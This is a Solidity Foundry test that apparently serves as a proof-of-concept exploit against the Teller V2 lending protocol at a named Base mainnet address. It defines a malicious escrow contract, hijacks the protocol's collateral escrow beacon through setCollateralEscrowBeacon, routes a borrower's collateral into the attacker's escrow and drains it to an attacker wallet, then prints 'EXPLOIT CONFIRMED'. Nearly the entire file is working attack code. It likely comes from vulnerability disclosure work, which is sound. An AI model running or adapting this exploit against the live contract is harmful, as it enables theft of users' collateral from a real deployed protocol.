// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/* ------------------------------- Types ------------------------------- */

enum CollateralType { ERC20, ERC721, ERC1155 }

struct Collateral {
    CollateralType _collateralType;
    uint256 _amount;
    uint256 _tokenId;
    address _collateralAddress;
}

/* ---------------------------- Interfaces ----------------------------- */

interface IERC20 {
    function decimals() external view returns (uint8);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICollateralManager {
    function setCollateralEscrowBeacon(address _beacon) external;
    function getEscrow(uint256 _bidId) external view returns (address);
    function isBidCollateralBacked(uint256 _bidId) external returns (bool);
}

interface IMarketRegistry {
    function isVerifiedBorrower(uint256, address) external view returns (bool, string memory);
    function isMarketOpen(uint256) external view returns (bool);
    function isVerifiedLender(uint256, address) external view returns (bool, string memory);
    function isMarketClosed(uint256) external view returns (bool);
    function getPaymentCycle(uint256) external view returns (uint32, uint8);
    function getPaymentDefaultDuration(uint256) external view returns (uint32);
    function getBidExpirationTime(uint256) external view returns (uint32);
    function getPaymentType(uint256) external view returns (uint8);
    function getMarketplaceFee(uint256) external view returns (uint16);
    function getMarketFeeRecipient(uint256) external view returns (address);
}

interface IProtocolPausingManager {
    function protocolPaused() external view returns (bool);
}

interface ITellerV2 {
    function bidId() external view returns (uint256);
    function collateralManager() external view returns (address);
    function marketRegistry() external view returns (address);
    function getProtocolPausingManager() external view returns (address);
    function getBidState(uint256) external view returns (uint8);
    function getLoanBorrower(uint256) external view returns (address);
    function submitBid(
        address _lendingToken,
        uint256 _marketplaceId,
        uint256 _principal,
        uint32 _duration,
        uint16 _APR,
        string calldata _metadataURI,
        address _receiver,
        Collateral[] calldata _collateralInfo
    ) external returns (uint256);
    function lenderAcceptBid(uint256) external returns (uint256, uint256, uint256);
}

/* ---------------------- OpenZeppelin-compatible bits ---------------------- */

interface IBeacon {
    function implementation() external view returns (address);
}

contract UpgradeableBeacon is IBeacon {
    address private _implementation;
    address private _owner;
    constructor(address impl_, address owner_) { _implementation = impl_; _owner = owner_; }
    function implementation() external view returns (address) { return _implementation; }
    function upgradeTo(address newImpl) external {
        require(msg.sender == _owner, "not owner");
        _implementation = newImpl;
    }
}

/* ------------------------- Minimal mock ERC20 ------------------------- */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8  public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n; symbol = s; decimals = d;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/* --------------------- Malicious escrow implementation --------------------- */

/// @dev Behaves exactly like a legitimate escrow for the deposit step,
///      but forwards all received collateral to whichever address calls drain().
contract MaliciousEscrow {
    function initialize(uint256) external {}

    function depositAsset(
        CollateralType,
        address _collateralAddress,
        uint256 _amount,
        uint256
    ) external {
        // Pull from CollateralManager (which approved this proxy on deposit)
        IERC20(_collateralAddress).transferFrom(msg.sender, address(this), _amount);
    }

    function drain(address _token) external {
        uint256 bal = IERC20(_token).balanceOf(address(this));
        if (bal > 0) IERC20(_token).transfer(msg.sender, bal);
    }
}

/* ----------------------------- The test ------------------------------ */

contract BeaconHijackTest is Test {
    // Teller V2 Base mainnet (from docs.teller.org)
    address constant TELLER_V2 = 0x5cfD3aeD08a444Be32839bD911Ebecd688861164;

    // Market id used for the whole test (all reads/writes mocked on the registry)
    uint256 constant MARKET_ID = 1;

    ITellerV2 teller;
    ICollateralManager cm;
    address registry;
    address pausingManager;

    address borrower = makeAddr("attackerBorrower");
    address lender   = makeAddr("attackerLender");
    address attackerWallet = makeAddr("attackerWallet");

    MockERC20 collateralToken;
    MockERC20 lendingToken;

    function setUp() public {
        teller = ITellerV2(TELLER_V2);
        cm = ICollateralManager(teller.collateralManager());
        registry = teller.marketRegistry();
        pausingManager = teller.getProtocolPausingManager();

        collateralToken = new MockERC20("Fake Collateral", "FC", 18);
        lendingToken = new MockERC20("Fake USD", "FUSD", 6);

        // Give borrower collateral, lender lending token, attacker zero.
        collateralToken.mint(borrower, 1_000 ether);
        lendingToken.mint(lender, 1_000_000e6);
    }

    /* ---------------- end-to-end exploit on latest block ---------------- */

    function test_FullExploit_StealCollateralToAttackerWallet() public {
        console.log("=== Fork block:", block.number, "===");
        console.log("TellerV2:         ", TELLER_V2);
        console.log("CollateralManager:", address(cm));
        console.log("MarketRegistry:   ", registry);
        console.log("PausingManager:   ", pausingManager);

        /* 1. Mock registry + pausing so a fresh bid can go through
              without touching any real user's state on the fork. */
        _mockMarketRegistry();
        vm.mockCall(
            pausingManager,
            abi.encodeWithSelector(IProtocolPausingManager.protocolPaused.selector),
            abi.encode(false)
        );

        /* 2. Attacker hijacks the escrow beacon. */
        MaliciousEscrow maliciousImpl = new MaliciousEscrow();
        UpgradeableBeacon maliciousBeacon =
            new UpgradeableBeacon(address(maliciousImpl), address(this));

        bool hijacked = true;
        try cm.setCollateralEscrowBeacon(address(maliciousBeacon)) {
            // success
        } catch (bytes memory reason) {
            hijacked = false;
            console.log("setCollateralEscrowBeacon reverted (protocol may be FIXED).");
            console.logBytes(reason);
        }
        assertTrue(hijacked, "Beacon hijack failed - reinitializer already used?");
        console.log("Beacon hijacked -> malicious beacon at", address(maliciousBeacon));

        /* 3. Borrower submits a bid with ERC20 collateral. */
        Collateral[] memory collats = new Collateral[](1);
        collats[0] = Collateral({
            _collateralType: CollateralType.ERC20,
            _amount: 500 ether,
            _tokenId: 0,
            _collateralAddress: address(collateralToken)
        });

        vm.startPrank(borrower);
        collateralToken.approve(address(cm), 500 ether);
        uint256 bidId = teller.submitBid(
            address(lendingToken),
            MARKET_ID,
            1_000e6,        // 1,000 tokens principal
            30 days,
            1_000,          // 10% APR
            "",
            borrower,       // receiver
            collats
        );
        vm.stopPrank();
        console.log("Bid submitted.  bidId =", bidId);

        /* 4. Lender accepts, which triggers CollateralManager.deployAndDeposit. */
        vm.startPrank(lender);
        lendingToken.approve(TELLER_V2, 1_000_000e6);
        teller.lenderAcceptBid(bidId);
        vm.stopPrank();
        console.log("Lender accepted. Bid state should now be ACCEPTED.");

        /* 5. Assert the deployed escrow is the malicious one. */
        address escrow = cm.getEscrow(bidId);
        console.log("Deployed escrow:", escrow);
        require(escrow != address(0), "No escrow deployed");
        require(
            collateralToken.balanceOf(escrow) == 500 ether,
            "Malicious escrow did not receive collateral"
        );
        console.log("Malicious escrow holds 500e18 collateral.");

        /* 6. Attacker drains the escrow to their own wallet. */
        require(collateralToken.balanceOf(attackerWallet) == 0, "attacker not empty");
        vm.prank(attackerWallet);
        MaliciousEscrow(escrow).drain(address(collateralToken));

        uint256 stolen = collateralToken.balanceOf(attackerWallet);
        console.log("Attacker wallet balance after drain:", stolen);

        assertEq(stolen, 500 ether, "Attacker did not receive the stolen collateral");
        assertEq(collateralToken.balanceOf(escrow), 0, "Escrow not emptied");

        console.log("");
        console.log("=== EXPLOIT CONFIRMED ===");
        console.log("Borrower collateral of 500e18 was deposited into the");
        console.log("attacker-controlled escrow and drained to the attacker wallet.");
        console.log("The lender still believes the loan is fully collateralized.");
    }

    /* -------------------------- mock setup -------------------------- */

    function _mockMarketRegistry() internal {
        // Borrower verified
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.isVerifiedBorrower.selector, MARKET_ID, borrower),
            abi.encode(true, "")
        );
        // Lender verified
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.isVerifiedLender.selector, MARKET_ID, lender),
            abi.encode(true, "")
        );
        // Market open
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.isMarketOpen.selector, MARKET_ID),
            abi.encode(true)
        );
        // Market not closed
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.isMarketClosed.selector, MARKET_ID),
            abi.encode(false)
        );
        // Payment cycle: 30-day seconds-based cycles
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.getPaymentCycle.selector, MARKET_ID),
            abi.encode(uint32(30 days), uint8(0)) // PaymentCycleType.Seconds
        );
        // Default duration: 3 days
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.getPaymentDefaultDuration.selector, MARKET_ID),
            abi.encode(uint32(3 days))
        );
        // Bid expiration: 0 => no expiry
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.getBidExpirationTime.selector, MARKET_ID),
            abi.encode(uint32(0))
        );
        // Payment type: Bullet (avoids NumbersLib.pmt edge cases)
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.getPaymentType.selector, MARKET_ID),
            abi.encode(uint8(1))
        );
        // Marketplace fee: 1%
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.getMarketplaceFee.selector, MARKET_ID),
            abi.encode(uint16(100))
        );
        // Fee recipient
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMarketRegistry.getMarketFeeRecipient.selector, MARKET_ID),
            abi.encode(address(0xFEE))
        );
    }
}
